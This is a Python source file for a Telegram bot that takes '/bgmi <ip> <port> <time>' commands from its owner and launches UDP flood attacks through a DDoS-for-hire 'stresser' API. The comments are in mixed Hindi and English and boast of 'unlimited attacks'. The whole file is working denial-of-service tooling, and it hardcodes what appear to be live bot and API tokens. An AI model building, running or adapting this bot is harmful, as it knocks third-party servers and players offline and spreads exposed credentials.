"""
⚔️ RAGEBITE WISPBYYTE BOT
Ye Wispbyte pe chalega. /bgmi commands receive karta hai aur attack API call karta hai.
Wispbyte IP se API call → Cloudflare clean ✅
Owner = Unlimited attacks (no restrictions)
"""

import telebot
import datetime
import os
import time
import threading
import json
import re
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer

# ==================== CONFIG ====================
BOT_TOKEN = "8820283088:AAFc1S2s2AgwcZTs7sm7CNyUoRjfAnII0_0"
OWNER_ID = "6321758394"

# ==================== 🔒 API SECRETS (HIDDEN) ====================
_API_SECRETS = {
    "endpoint":    "https://stresser.works/api/start",
    "token":       "ed0d3a83ab3dc439bb7e8fc7a7861ca96b47dcb2b753fba5d3bfdd373898351f",
    "method":      "UDP-BIG",
    "concs":       "6",
    "geolocation": "ALL",
}

# ==================== BOT ====================
bot = telebot.TeleBot(BOT_TOKEN)


def now():
    return time.time()


# ==================== 🔒 API CALL (NO RESTRICTIONS) ====================
def start_attack(ip, port, duration):
    """Fire attack using hardcoded endpoint + token."""
    try:
        print(f"📤 Sending attack: {ip}:{port} for {duration}s")

        params = {
            "token":       _API_SECRETS["token"],
            "host":        ip,
            "port":        port,
            "time":        duration,
            "method":      _API_SECRETS["method"],
            "concs":       _API_SECRETS["concs"],
            "geolocation": _API_SECRETS["geolocation"],
        }

        response = requests.get(_API_SECRETS["endpoint"], params=params, timeout=20)
        print(f"📥 Response status: {response.status_code}")

        if 200 <= response.status_code < 300:
            return {"success": True, "raw": response.text[:300]}
        else:
            return {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        print(f"⚠️ Attack Error: {type(e).__name__}")
        return {"success": False, "error": "Network error"}


# ==================== /START ====================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if str(message.from_user.id) != str(OWNER_ID):
        bot.reply_to(message, "🚫 Only Owner")
        return
    bot.reply_to(message, (
        "⚔️ *RAGEBITE WISPBYYTE BOT*\n\n"
        "📌 Owner = Unlimited attacks\n\n"
        "Format: `/bgmi <ip> <port> <time>`\n"
        "Example: `/bgmi 8.8.8.8 53 30`\n\n"
        "🔒 Ye bot sirf owner ke DM se commands accept karta hai.\n"
        "🚀 Ek time pe kitne bhi attacks maar sakte ho."
    ), parse_mode='Markdown')


# ==================== /BGMI — UNLIMITED ATTACK HANDLER ====================
@bot.message_handler(commands=['bgmi'])
def cmd_bgmi(message):
    """Owner ke DM se /bgmi <ip> <port> <time> aaye toh attack laga do."""
    if str(message.from_user.id) != str(OWNER_ID):
        bot.reply_to(message, "🚫 Only Owner")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "❌ Usage: /bgmi <ip> <port> <time>")
        return

    target, port_str, time_str = command[1], command[2], command[3]

    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        bot.reply_to(message, "❌ Invalid IP.")
        return

    try:
        port = int(port_str)
        duration = int(time_str)
        if not 1 <= port <= 65535:
            bot.reply_to(message, "❌ Port must be 1-65535.")
            return
        if duration < 10 or duration > 300:
            bot.reply_to(message, "❌ Time must be 10-300 seconds.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Invalid numbers.")
        return

    print(f"🎯 Received /bgmi: {target}:{port} for {duration}s")

    def fire():
        result = start_attack(target, port, duration)
        if result.get("success"):
            finish_time = (datetime.datetime.now() + datetime.timedelta(seconds=duration)).strftime('%H:%M:%S')
            try:
                bot.send_message(
                    message.chat.id,
                    f"✅ *ATTACK LAUNCHED!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"⏱ Duration: {duration}s\n"
                    f"⌛ Finishes: {finish_time}\n\n"
                    f"🔥 RAGEBITE",
                    parse_mode='Markdown'
                )
            except:
                pass
        else:
            try:
                bot.send_message(
                    message.chat.id,
                    f"❌ Attack Failed: {result.get('error')}"
                )
            except:
                pass

    threading.Thread(target=fire, daemon=True).start()

    try:
        bot.reply_to(message, f"⚡ Attack firing: `{target}:{port}` for {duration}s", parse_mode='Markdown')
    except:
        pass


# ==================== HEALTH SERVER ====================
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Wispbyte Bot is running!")

def start_health_server():
    try:
        server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
        server.serve_forever()
    except:
        pass


# ==================== MAIN ====================
def main():
    print("=" * 60)
    print("⚔️ RAGEBITE WISPBYYTE BOT")
    print("=" * 60)
    print(f"👑 Owner: {OWNER_ID}")
    print(f"🔒 API: HIDDEN")
    print(f"🚀 Mode: UNLIMITED ATTACKS (No restrictions)")
    print("=" * 60)
    print("✅ Bot is running...")
    print("=" * 60)

    threading.Thread(target=start_health_server, daemon=True).start()

    while True:
        try:
            bot.polling(non_stop=True, interval=1, timeout=60)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
